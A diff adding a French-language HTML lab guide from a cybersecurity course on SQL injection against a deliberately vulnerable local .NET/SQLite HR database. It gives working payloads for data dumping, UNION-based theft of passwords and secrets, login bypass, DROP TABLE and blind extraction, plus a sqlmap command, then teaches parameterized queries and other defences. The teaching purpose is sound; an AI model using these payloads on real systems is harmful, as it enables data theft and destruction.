@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Labo SQL Injection | Cybersecurite</title>
+    <style>
+        :root {
+            --bg: #0f1117; --surface: #1a1d27; --surface-2: #242736;
+            --accent: #ffa502; --accent-light: #ffbe76;
+            --danger: #ff4757; --success: #2ed573; --warning: #ffa502;
+            --text: #e4e6eb; --text-muted: #8b8fa3; --border: #2e3142; --code-bg: #12131a;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.7; }
+
+        nav { position:fixed; top:0; left:0; width:260px; height:100vh; background:var(--surface); border-right:1px solid var(--border); padding:2rem 0; overflow-y:auto; z-index:100; }
+        nav .logo { padding:0 1.5rem 1.5rem; border-bottom:1px solid var(--border); margin-bottom:1rem; }
+        nav .logo h2 { font-size:1.1rem; color:var(--accent); }
+        nav .logo span { font-size:0.75rem; color:var(--text-muted); }
+        nav a { display:block; padding:0.6rem 1.5rem; color:var(--text-muted); text-decoration:none; font-size:0.9rem; transition:all 0.2s; border-left:3px solid transparent; }
+        nav a:hover { color:var(--text); background:var(--surface-2); border-left-color:var(--accent); }
+
+        main { margin-left:260px; max-width:900px; padding:3rem 4rem; }
+        h1 { font-size:2.5rem; margin-bottom:0.5rem; color:#fff; }
+        .subtitle { color:var(--text-muted); font-size:1.1rem; margin-bottom:3rem; }
+        h2 { font-size:1.6rem; margin-top:3rem; margin-bottom:1rem; padding-bottom:0.5rem; border-bottom:2px solid var(--accent); color:#fff; }
+        h3 { font-size:1.2rem; margin-top:2rem; margin-bottom:0.7rem; color:var(--accent-light); }
+        p { margin-bottom:1rem; }
+
+        .alert { padding:1rem 1.2rem; border-radius:8px; margin:1.5rem 0; border-left:4px solid; }
+        .alert-danger { background:rgba(255,71,87,0.1); border-color:var(--danger); }
+        .alert-success { background:rgba(46,213,115,0.1); border-color:var(--success); }
+        .alert-warning { background:rgba(255,165,2,0.1); border-color:var(--warning); }
+        .alert-info { background:rgba(108,99,255,0.1); border-color:#6c63ff; }
+        .alert strong { display:block; margin-bottom:0.3rem; }
+
+        pre { background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:1.2rem; overflow-x:auto; margin:1rem 0 1.5rem; font-size:0.85rem; }
+        code { font-family:'Cascadia Code','Fira Code','Consolas',monospace; color:var(--accent-light); }
+        pre code { color:var(--text); }
+        .kw { color:#c678dd; } .str { color:#98c379; } .cmt { color:#5c6370; font-style:italic; }
+        .fn { color:#61afef; } .val { color:#d19a66; } .danger-hl { color:#ff4757; font-weight:bold; }
+        .safe-hl { color:#2ed573; font-weight:bold; }
+
+        table { width:100%; border-collapse:collapse; margin:1.5rem 0; font-size:0.92rem; }
+        th, td { padding:0.8rem 1rem; text-align:left; border:1px solid var(--border); }
+        th { background:var(--surface-2); color:var(--accent-light); font-weight:600; }
+        tr:hover td { background:var(--surface); }
+
+        .badge { display:inline-block; padding:0.15rem 0.5rem; border-radius:4px; font-size:0.75rem; font-weight:600; text-transform:uppercase; }
+        .badge-danger { background:rgba(255,71,87,0.2); color:var(--danger); }
+        .badge-success { background:rgba(46,213,115,0.2); color:var(--success); }
+
+        .comparison { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; margin:1.5rem 0; }
+        .card { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:1.5rem; }
+        .card h4 { margin-bottom:0.8rem; font-size:1rem; }
+        .card.bad { border-top:3px solid var(--danger); } .card.bad h4 { color:var(--danger); }
+        .card.good { border-top:3px solid var(--success); } .card.good h4 { color:var(--success); }
+
+        ul, ol { margin:0.8rem 0 1.2rem 1.5rem; } li { margin-bottom:0.4rem; }
+
+        .diagram { background:var(--surface); border:1px solid var(--border); border-radius:12px; padding:2rem; margin:2rem 0; }
+        .sql-box { background:#1a1a2e; border:1px solid #333; border-radius:6px; padding:1rem; margin:1rem 0; font-family:monospace; font-size:0.88rem; }
+        .sql-box .injected { color:var(--danger); font-weight:bold; }
+        .sql-box .safe { color:var(--success); }
+        .sql-box .original { color:var(--text-muted); }
+
+        footer { margin-top:4rem; padding:2rem 0; border-top:1px solid var(--border); color:var(--text-muted); font-size:0.85rem; text-align:center; }
+
+        @media (max-width:900px) { nav { display:none; } main { margin-left:0; padding:2rem 1.5rem; } .comparison { grid-template-columns:1fr; } }
+    </style>
+</head>
+<body>
+
+<nav>
+    <div class="logo">
+        <h2>SQL Injection Lab</h2>
+        <span>Labo 3 - Programmation Securisee</span>
+    </div>
+    <a href="#intro">Introduction</a>
+    <a href="#principe">Principe de l'injection</a>
+    <a href="#types">Types d'injection SQL</a>
+    <a href="#bdd">La base de donnees</a>
+    <a href="#attaque-dump">Attaque : dump de donnees</a>
+    <a href="#attaque-union">Attaque : UNION</a>
+    <a href="#attaque-login">Attaque : bypass login</a>
+    <a href="#attaque-drop">Attaque : DROP TABLE</a>
+    <a href="#vulnerable-vs-secure">Vulnerable vs Securise</a>
+    <a href="#orm">ORM et Entity Framework</a>
+    <a href="#exercices">Exercices</a>
+    <a href="#protections">Protections</a>
+</nav>
+
+<main>
+    <section id="intro">
+        <h1>SQL Injection</h1>
+        <p class="subtitle">Exploitation d'une base de donnees personnelles via injection SQL en .NET</p>
+
+        <div class="alert alert-warning">
+            <strong>Avertissement legal</strong>
+            Ce labo est strictement educatif. L'injection SQL sur des systemes sans autorisation
+            est un delit (acces frauduleux a un systeme d'information).
+        </div>
+
+        <p>
+            L'<strong>injection SQL</strong> (SQLi) est une vulnerabilite qui permet a un attaquant de manipuler
+            les requetes SQL executees par une application, en injectant du code SQL via les champs de saisie.
+            C'est la vulnerabilite <strong>n&deg;3 du OWASP Top 10</strong> (Injection).
+        </p>
+        <p>
+            Consequences possibles : vol de donnees, modification ou suppression de la base,
+            bypass d'authentification, execution de commandes systeme, acces complet au serveur.
+        </p>
+    </section>
+
+    <section id="principe">
+        <h2>Principe fondamental</h2>
+
+        <p>L'injection SQL exploite le melange entre <strong>code SQL</strong> et <strong>donnees utilisateur</strong> dans une meme chaine :</p>
+
+        <div class="sql-box">
+            <span class="cmt">// Code C# vulnerable :</span><br>
+            var sql = <span class="original">$"SELECT * FROM Users WHERE Name = '</span><span class="injected">{userInput}</span><span class="original">'"</span>;
+        </div>
+
+        <p>Si l'utilisateur entre <code>Jean</code>, la requete est normale :</p>
+        <div class="sql-box">
+            SELECT * FROM Users WHERE Name = '<span class="safe">Jean</span>'
+        </div>
+
+        <p>Mais s'il entre <code>' OR '1'='1</code>, il <strong>modifie la structure</strong> de la requete :</p>
+        <div class="sql-box">
+            SELECT * FROM Users WHERE Name = '<span class="injected">' OR '1'='1</span>'<br>
+            <span class="cmt">-- Equivalent a : SELECT * FROM Users WHERE (Name = '') OR ('1'='1')</span><br>
+            <span class="cmt">-- '1'='1' est TOUJOURS vrai : retourne TOUT !</span>
+        </div>
+
+        <div class="alert alert-danger">
+            <strong>Le probleme</strong>
+            Le moteur SQL ne fait aucune difference entre le code ecrit par le developpeur
+            et le code injecte par l'utilisateur. Pour lui, c'est une seule chaine SQL a executer.
+        </div>
+    </section>
+
+    <section id="types">
+        <h2>Types d'injection SQL</h2>
+
+        <table>
+            <thead><tr><th>Type</th><th>Technique</th><th>Detection</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><strong>In-band (classique)</strong></td>
+                    <td>Le resultat de l'injection est visible directement dans la reponse</td>
+                    <td><span class="badge badge-success">FACILE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>UNION-based</strong></td>
+                    <td>Utilise UNION SELECT pour extraire des donnees d'autres tables</td>
+                    <td><span class="badge badge-success">FACILE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Error-based</strong></td>
+                    <td>Exploite les messages d'erreur SQL pour extraire des informations</td>
+                    <td><span class="badge badge-success">FACILE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Blind (boolean)</strong></td>
+                    <td>La reponse change (contenu different) selon que la condition injectee est vraie ou fausse</td>
+                    <td><span class="badge badge-danger">DIFFICILE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Blind (time-based)</strong></td>
+                    <td>Utilise SLEEP() ou WAITFOR pour mesurer le temps de reponse</td>
+                    <td><span class="badge badge-danger">DIFFICILE</span></td>
+                </tr>
+                <tr>
+                    <td><strong>Out-of-band</strong></td>
+                    <td>Exfiltration via DNS ou HTTP (ex: xp_cmdshell, LOAD_FILE)</td>
+                    <td><span class="badge badge-danger">TRES DIFFICILE</span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-info">
+            <strong>Dans ce labo</strong>
+            Nous couvrons les types in-band et UNION-based, les plus courants et pedagogiques.
+        </div>
+    </section>
+
+    <section id="bdd">
+        <h2>La base de donnees du labo</h2>
+
+        <p>Le labo utilise une base SQLite en memoire avec 3 tables simulant un systeme RH :</p>
+
+        <h3>Table Persons (10 employes)</h3>
+        <pre><code>CREATE TABLE Persons (
+    Id INTEGER PRIMARY KEY,
+    FirstName TEXT, LastName TEXT, Email TEXT,
+    Phone TEXT, Address TEXT, City TEXT,
+    <span class="danger-hl">NationalId TEXT</span>,       <span class="cmt">-- Numero de registre national</span>
+    DateOfBirth TEXT,
+    <span class="danger-hl">CreditCard TEXT</span>,       <span class="cmt">-- Numero de carte de credit</span>
+    <span class="danger-hl">Iban TEXT</span>,              <span class="cmt">-- Compte bancaire</span>
+    <span class="danger-hl">Salary REAL</span>,            <span class="cmt">-- Salaire</span>
+    Department TEXT
+);</code></pre>
+
+        <h3>Table Users (4 comptes)</h3>
+        <pre><code>CREATE TABLE Users (
+    Id INTEGER PRIMARY KEY,
+    Username TEXT,
+    <span class="danger-hl">Password TEXT</span>,          <span class="cmt">-- En clair ! (volontairement vulnerable)</span>
+    Role TEXT,              <span class="cmt">-- admin, user, manager</span>
+    Email TEXT
+);</code></pre>
+
+        <h3>Table SecretConfig (secrets de l'application)</h3>
+        <pre><code>CREATE TABLE SecretConfig (
+    Key TEXT PRIMARY KEY,
+    <span class="danger-hl">Value TEXT</span>              <span class="cmt">-- Connection strings, cles API, JWT secrets...</span>
+);</code></pre>
+    </section>
+
+    <section id="attaque-dump">
+        <h2>Attaque 1 : Dump de toutes les donnees</h2>
+
+        <h3>Objectif</h3>
+        <p>Recuperer <strong>tous</strong> les enregistrements au lieu d'un seul.</p>
+
+        <h3>Payload</h3>
+        <pre><code>' OR '1'='1</code></pre>
+
+        <h3>Decomposition</h3>
+        <div class="sql-box">
+            <span class="cmt">-- Requete prevue par le developpeur :</span><br>
+            SELECT * FROM Persons WHERE LastName LIKE '%<span class="safe">Dupont</span>%'<br><br>
+
+            <span class="cmt">-- Requete avec l'injection :</span><br>
+            SELECT * FROM Persons WHERE LastName LIKE '%<span class="injected">' OR '1'='1</span>%'<br><br>
+
+            <span class="cmt">-- Le moteur SQL evalue :</span><br>
+            <span class="cmt">-- (LastName LIKE '%') &nbsp;=&gt; chaine vide, matche rien</span><br>
+            <span class="cmt">-- OR ('1'='1%') &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; TOUJOURS VRAI</span><br>
+            <span class="cmt">-- Resultat : toutes les lignes sont retournees !</span>
+        </div>
+
+        <div class="alert alert-danger">
+            <strong>Impact</strong>
+            L'attaquant recoit les 10 enregistrements avec nom, email, telephone, adresse,
+            numero national, carte de credit, IBAN et salaire de tous les employes.
+        </div>
+    </section>
+
+    <section id="attaque-union">
+        <h2>Attaque 2 : UNION SELECT (extraction cross-table)</h2>
+
+        <h3>Objectif</h3>
+        <p>Extraire des donnees d'une <strong>autre table</strong> (Users, SecretConfig).</p>
+
+        <h3>Payload : voler les mots de passe</h3>
+        <pre><code>' UNION SELECT 1,Username,Password,Email,Role,'','','','','','',0,'' FROM Users --</code></pre>
+
+        <h3>Decomposition</h3>
+        <div class="sql-box">
+            <span class="cmt">-- Requete resultante :</span><br>
+            SELECT * FROM Persons WHERE LastName LIKE '%<span class="injected">'<br>
+            UNION SELECT 1,Username,Password,Email,Role,'','','','','','',0,''<br>
+            FROM Users --</span>%'<br><br>
+            <span class="cmt">-- Le -- commente le reste de la requete originale</span><br>
+            <span class="cmt">-- UNION combine les resultats des deux SELECT</span><br>
+            <span class="cmt">-- Les colonnes doivent correspondre (13 colonnes dans Persons)</span>
+        </div>
+
+        <h3>Payload : voler les secrets de config</h3>
+        <pre><code>' UNION SELECT 1,Key,Value,'','','','','','','','',0,'' FROM SecretConfig --</code></pre>
+
+        <div class="alert alert-danger">
+            <strong>Impact</strong>
+            L'attaquant recupere les mots de passe en clair, les cles API, les connection strings
+            de production, les secrets JWT... C'est un acces total au systeme.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Condition pour UNION</strong>
+            Le nombre de colonnes du UNION SELECT doit correspondre au nombre de colonnes
+            du SELECT original. Pour trouver ce nombre, on peut tester :
+            <code>' UNION SELECT 1--</code>, <code>' UNION SELECT 1,2--</code>,
+            <code>' UNION SELECT 1,2,3--</code> ... jusqu'a ne plus avoir d'erreur.
+        </div>
+    </section>
+
+    <section id="attaque-login">
+        <h2>Attaque 3 : Bypass d'authentification</h2>
+
+        <h3>Objectif</h3>
+        <p>Se connecter <strong>sans connaitre le mot de passe</strong>.</p>
+
+        <h3>Payload dans le champ username</h3>
+        <pre><code>admin' --</code></pre>
+
+        <h3>Decomposition</h3>
+        <div class="sql-box">
+            <span class="cmt">-- Requete prevue :</span><br>
+            SELECT * FROM Users WHERE Username = '<span class="safe">admin</span>' AND Password = '<span class="safe">motdepasse</span>'<br><br>
+
+            <span class="cmt">-- Requete avec injection dans username :</span><br>
+            SELECT * FROM Users WHERE Username = '<span class="injected">admin' --</span>' AND Password = 'nimportequoi'<br><br>
+
+            <span class="cmt">-- Ce que le moteur SQL execute :</span><br>
+            SELECT * FROM Users WHERE Username = 'admin' <span class="injected">-- tout le reste est un commentaire</span><br>
+            <span class="cmt">-- Le mot de passe n'est JAMAIS verifie !</span>
+        </div>
+
+        <h3>Variante : se connecter comme n'importe qui</h3>
+        <pre><code><span class="cmt">// Dans le champ username :</span>
+' OR '1'='1' --
+
+<span class="cmt">// Resultat : le WHERE est toujours vrai</span>
+<span class="cmt">// Retourne le PREMIER utilisateur de la table (souvent l'admin)</span></code></pre>
+    </section>
+
+    <section id="attaque-drop">
+        <h2>Attaque 4 : DROP TABLE (destruction)</h2>
+
+        <h3>Payload</h3>
+        <pre><code>'; DROP TABLE Persons; --</code></pre>
+
+        <h3>Decomposition</h3>
+        <div class="sql-box">
+            <span class="cmt">-- Requete resultante :</span><br>
+            SELECT * FROM Persons WHERE LastName LIKE '%<span class="injected">';<br>
+            DROP TABLE Persons;<br>
+            --</span>%'<br><br>
+            <span class="cmt">-- Le ; termine la premiere requete</span><br>
+            <span class="cmt">-- DROP TABLE Persons supprime TOUTE la table</span><br>
+            <span class="cmt">-- -- commente le reste</span>
+        </div>
+
+        <div class="alert alert-danger">
+            <strong>Impact</strong>
+            La table Persons est <strong>supprimee definitivement</strong> avec toutes ses donnees.
+            Dans le labo, utilisez le bouton "Reset BDD" dans la console SQL pour la restaurer.
+            En production, c'est souvent irreversible sans backup.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Note SQLite</strong>
+            SQLite ne supporte pas l'execution de requetes multiples par defaut dans un seul
+            <code>ExecuteReader()</code>. Ce payload peut echouer dans notre labo mais fonctionne
+            sur SQL Server, MySQL et PostgreSQL avec les drivers standards.
+        </div>
+    </section>
+
+    <section id="vulnerable-vs-secure">
+        <h2>Code vulnerable vs securise</h2>
+
+        <div class="comparison">
+            <div class="card bad">
+                <h4>VULNERABLE : string concatenation</h4>
+<pre><code><span class="cmt">// L'input est injecte dans la chaine SQL</span>
+<span class="kw">var</span> sql = <span class="danger-hl">$"SELECT * FROM Persons
+  WHERE LastName LIKE '%{searchTerm}%'"</span>;
+
+cmd.CommandText = sql;
+cmd.ExecuteReader();</code></pre>
+                <p style="color:var(--danger); font-size:0.85rem;">
+                    Le moteur SQL ne distingue pas le code du developpeur de l'input utilisateur.
+                </p>
+            </div>
+            <div class="card good">
+                <h4>SECURISE : requetes parametrees</h4>
+<pre><code><span class="cmt">// L'input est passe comme parametre separe</span>
+<span class="kw">var</span> sql = "SELECT * FROM Persons
+  WHERE LastName LIKE <span class="safe-hl">$term</span>";
+
+cmd.CommandText = sql;
+<span class="safe-hl">cmd.Parameters.AddWithValue("$term",
+  $"%{searchTerm}%");</span>
+cmd.ExecuteReader();</code></pre>
+                <p style="color:var(--success); font-size:0.85rem;">
+                    Le moteur SQL traite le parametre comme une VALEUR, jamais comme du code.
+                </p>
+            </div>
+        </div>
+
+        <div class="alert alert-success">
+            <strong>Principe fondamental</strong>
+            Avec les requetes parametrees, la <strong>structure</strong> de la requete et les <strong>valeurs</strong>
+            sont envoyees <strong>separement</strong> au moteur SQL. Il est donc <strong>physiquement impossible</strong>
+            qu'une valeur modifie la structure de la requete.
+        </div>
+    </section>
+
+    <section id="orm">
+        <h2>ORM et Entity Framework</h2>
+
+        <p>Les ORM (Object-Relational Mappers) comme Entity Framework utilisent des requetes parametrees par defaut :</p>
+
+        <pre><code><span class="cmt">// Entity Framework - SECURISE par defaut</span>
+<span class="kw">var</span> persons = context.Persons
+    .Where(p => p.LastName.Contains(searchTerm))
+    .ToList();
+
+<span class="cmt">// EF genere automatiquement :</span>
+<span class="cmt">// SELECT * FROM Persons WHERE LastName LIKE @p0</span>
+<span class="cmt">// avec @p0 = '%searchTerm%' (parametre)</span></code></pre>
+
+        <div class="alert alert-warning">
+            <strong>Attention : raw SQL dans les ORM</strong>
+            Meme avec un ORM, on peut creer des injections SQL si on utilise du SQL brut :
+        </div>
+
+<pre><code><span class="cmt">// DANGEREUX meme avec Entity Framework !</span>
+context.Persons
+    .<span class="danger-hl">FromSqlRaw</span>(<span class="danger-hl">$"SELECT * FROM Persons WHERE Name = '{input}'"</span>)
+    .ToList();
+
+<span class="cmt">// SECURISE avec FromSqlInterpolated :</span>
+context.Persons
+    .<span class="safe-hl">FromSqlInterpolated</span>($"SELECT * FROM Persons WHERE Name = {input}")
+    .ToList();</code></pre>
+    </section>
+
+    <section id="exercices">
+        <h2>Exercices</h2>
+
+        <div class="alert alert-info">
+            <strong>Exercice 1 : Enumeration</strong>
+            En utilisant la page de recherche vulnerable, trouvez le nombre de tables dans la base
+            et leurs noms. Indice : <code>SELECT name FROM sqlite_master WHERE type='table'</code>
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 2 : UNION progressive</strong>
+            Construisez un payload UNION SELECT en partant de 1 colonne et en augmentant
+            jusqu'a trouver le bon nombre. Documentez votre demarche.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 3 : Extraction ciblee</strong>
+            Extrayez uniquement les salaires superieurs a 4000 EUR en combinant UNION et WHERE.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 4 : Blind SQLi (avance)</strong>
+            En utilisant <code>' AND SUBSTR(Password,1,1)='A' --</code> dans le login,
+            extrayez le mot de passe de l'admin caractere par caractere.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 5 : Remediation</strong>
+            Comparez le code de <code>SearchVulnerable()</code> et <code>SearchSecure()</code>
+            dans <code>DatabaseService.cs</code>. Identifiez les 3 differences cles.
+        </div>
+
+        <div class="alert alert-info">
+            <strong>Exercice 6 : SQLMap (avance)</strong>
+            Si sqlmap est installe, essayez-le contre le endpoint vulnerable :
+            <code>sqlmap -u "http://localhost:5000/Search/Vulnerable?q=test" --tables</code>
+        </div>
+    </section>
+
+    <section id="protections">
+        <h2>Protections contre l'injection SQL</h2>
+
+        <table>
+            <thead><tr><th>Protection</th><th>Efficacite</th><th>Details</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><strong>Requetes parametrees</strong></td>
+                    <td><span class="badge badge-success">ESSENTIEL</span></td>
+                    <td>Separation code/donnees. Protection complete contre l'injection classique.</td>
+                </tr>
+                <tr>
+                    <td><strong>ORM (Entity Framework)</strong></td>
+                    <td><span class="badge badge-success">ESSENTIEL</span></td>
+                    <td>Parametrise par defaut. Eviter <code>FromSqlRaw</code> avec des inputs utilisateur.</td>
+                </tr>
+                <tr>
+                    <td><strong>Stored Procedures</strong></td>
+                    <td><span class="badge badge-success">BON</span></td>
+                    <td>Le SQL est precompile cote serveur, mais attention au SQL dynamique dans les SP.</td>
+                </tr>
+                <tr>
+                    <td><strong>Validation des entrees</strong></td>
+                    <td><span class="badge badge-success">BON</span></td>
+                    <td>Whitelist de caracteres, validation du type (nombre, date...). Couche supplementaire.</td>
+                </tr>
+                <tr>
+                    <td><strong>Principe du moindre privilege</strong></td>
+                    <td><span class="badge badge-success">BON</span></td>
+                    <td>Le compte SQL de l'app ne devrait pas pouvoir DROP TABLE ou acceder aux tables admin.</td>
+                </tr>
+                <tr>
+                    <td><strong>WAF (Web Application Firewall)</strong></td>
+                    <td><span class="badge badge-danger">INSUFFISANT</span></td>
+                    <td>Peut etre contourne avec de l'encodage, des commentaires, de l'obfuscation.</td>
+                </tr>
+                <tr>
+                    <td><strong>Filtrage par blacklist</strong></td>
+                    <td><span class="badge badge-danger">INSUFFISANT</span></td>
+                    <td>Bloquer <code>SELECT</code>, <code>UNION</code>, <code>'</code> ? Facilement contournable.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div class="alert alert-success">
+            <strong>Regle d'or</strong>
+            <strong>Toujours</strong> utiliser des requetes parametrees ou un ORM.
+            Il n'y a aucune raison valable de concatener des inputs utilisateur dans du SQL.
+            C'est la seule protection qui soit a la fois simple et fiable a 100%.
+        </div>
+    </section>
+
+    <footer>
+        Condorcet 2026 - BAC Cyber Securite - Programmation Securisee - Labo 3 : SQL Injection
+    </footer>
+</main>
+
+</body>
+</html>
